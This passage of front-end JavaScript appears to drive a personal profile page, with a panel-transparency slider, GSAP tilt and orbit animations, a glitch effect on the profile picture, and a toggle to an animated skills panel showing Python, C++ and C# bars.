    volumeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });


  transparencySlider.addEventListener('input', () => {
    const opacity = transparencySlider.value;
    if (opacity == 0) {
      profileBlock.style.background = 'rgba(0, 0, 0, 0)';
      profileBlock.style.borderOpacity = '0';
      profileBlock.style.borderColor = 'transparent';
      profileBlock.style.backdropFilter = 'none';
      skillsBlock.style.background = 'rgba(0, 0, 0, 0)';
      skillsBlock.style.borderOpacity = '0';
      skillsBlock.style.borderColor = 'transparent';
      skillsBlock.style.backdropFilter = 'none';

      profileBlock.style.pointerEvents = 'auto';
      socialIcons.forEach(icon => {
        icon.style.pointerEvents = 'auto';
        icon.style.opacity = '1';
      });
      badges.forEach(badge => {
        badge.style.pointerEvents = 'auto';
        badge.style.opacity = '1';
      });
      profilePicture.style.pointerEvents = 'auto';
      profilePicture.style.opacity = '1';
      profileName.style.opacity = '1';
      profileBio.style.opacity = '1';
      visitorCount.style.opacity = '1';
    } else {
      profileBlock.style.background = `rgba(0, 0, 0, ${opacity})`;
      profileBlock.style.borderOpacity = opacity;
      profileBlock.style.borderColor = '';
      profileBlock.style.backdropFilter = `blur(${10 * opacity}px)`;
      skillsBlock.style.background = `rgba(0, 0, 0, ${opacity})`;
      skillsBlock.style.borderOpacity = opacity;
      skillsBlock.style.borderColor = '';
      skillsBlock.style.backdropFilter = `blur(${10 * opacity}px)`;
      profileBlock.style.pointerEvents = 'auto';
      socialIcons.forEach(icon => {
        icon.style.pointerEvents = 'auto';
        icon.style.opacity = '1';
      });
      badges.forEach(badge => {
        badge.style.pointerEvents = 'auto';
        badge.style.opacity = '1';
      });
      profilePicture.style.pointerEvents = 'auto';
      profilePicture.style.opacity = '1';
      profileName.style.opacity = '1';
      profileBio.style.opacity = '1';
      visitorCount.style.opacity = '1';
    }
  });


  function handleTilt(e, element) {
    const rect = element.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    let clientX, clientY;

    if (e.type === 'touchmove') {
      clientX = e.touches[0].clientX;
      clientY = e.touches[0].clientY;
    } else {
      clientX = e.clientX;
      clientY = e.clientY;
    }

    const mouseX = clientX - centerX;
    const mouseY = clientY - centerY;

    const maxTilt = 15;
    const tiltX = (mouseY / rect.height) * maxTilt;
    const tiltY = -(mouseX / rect.width) * maxTilt;

    gsap.to(element, {
      rotationX: tiltX,
      rotationY: tiltY,
      duration: 0.3,
      ease: 'power2.out',
      transformPerspective: 1000
    });
  }

  profileBlock.addEventListener('mousemove', (e) => handleTilt(e, profileBlock));
  profileBlock.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, profileBlock);
  });

  skillsBlock.addEventListener('mousemove', (e) => handleTilt(e, skillsBlock));
  skillsBlock.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, skillsBlock);
  });

  profileBlock.addEventListener('mouseleave', () => {
    gsap.to(profileBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  profileBlock.addEventListener('touchend', () => {
    gsap.to(profileBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });

  skillsBlock.addEventListener('mouseleave', () => {
    gsap.to(skillsBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  skillsBlock.addEventListener('touchend', () => {
    gsap.to(skillsBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });


  profilePicture.addEventListener('mouseenter', () => {
    glitchOverlay.style.opacity = '1';
    setTimeout(() => {
      glitchOverlay.style.opacity = '0';
    }, 500);
  });


  profilePicture.addEventListener('click', () => {
    profileContainer.classList.remove('fast-orbit');
    profileContainer.classList.remove('orbit');
    void profileContainer.offsetWidth;
    profileContainer.classList.add('fast-orbit');
    setTimeout(() => {
      profileContainer.classList.remove('fast-orbit');
      void profileContainer.offsetWidth;
      profileContainer.classList.add('orbit');
    }, 500);
  });

  profilePicture.addEventListener('touchstart', (e) => {
    e.preventDefault();
    profileContainer.classList.remove('fast-orbit');
    profileContainer.classList.remove('orbit');
    void profileContainer.offsetWidth;
    profileContainer.classList.add('fast-orbit');
    setTimeout(() => {
      profileContainer.classList.remove('fast-orbit');
      void profileContainer.offsetWidth;
      profileContainer.classList.add('orbit');
    }, 500);
  });


  let isShowingSkills = false;
  resultsButton.addEventListener('click', () => {
    if (!isShowingSkills) {
      gsap.to(profileBlock, {
        x: -100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          profileBlock.classList.add('hidden');
          skillsBlock.classList.remove('hidden');
          gsap.fromTo(skillsBlock,
            { x: 100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
          gsap.to(pythonBar, { width: '87%', duration: 2, ease: 'power2.out' });
          gsap.to(cppBar, { width: '75%', duration: 2, ease: 'power2.out' });
          gsap.to(csharpBar, { width: '80%', duration: 2, ease: 'power2.out' });
        }
      });
      resultsHint.classList.remove('hidden');
      isShowingSkills = true;
    } else {
      gsap.to(skillsBlock, {
        x: 100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          skillsBlock.classList.add('hidden');
          profileBlock.classList.remove('hidden');
          gsap.fromTo(profileBlock,
            { x: -100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
        }
      });
      resultsHint.classList.add('hidden');
      isShowingSkills = false;
    }
  });

  resultsButton.addEventListener('touchstart', (e) => {
    e.preventDefault();
    if (!isShowingSkills) {
      gsap.to(profileBlock, {
        x: -100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          profileBlock.classList.add('hidden');
          skillsBlock.classList.remove('hidden');
          gsap.fromTo(skillsBlock,
            { x: 100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
          gsap.to(pythonBar, { width: '87%', duration: 2, ease: 'power2.out' });
          gsap.to(cppBar, { width: '75%', duration: 2, ease: 'power2.out' });
          gsap.to(csharpBar, { width: '80%', duration: 2, ease: 'power2.out' });
        }
      });
      resultsHint.classList.remove('hidden');
      isShowingSkills = true;
    } else {
      gsap.to(skillsBlock, {
        x: 100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          skillsBlock.classList.add('hidden');
          profileBlock.classList.remove('hidden');
          gsap.fromTo(profileBlock,
            { x: -100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
        }
      });
      resultsHint.classList.add('hidden');
      isShowingSkills = true;
    }
  });


  typeWriterStart();
});
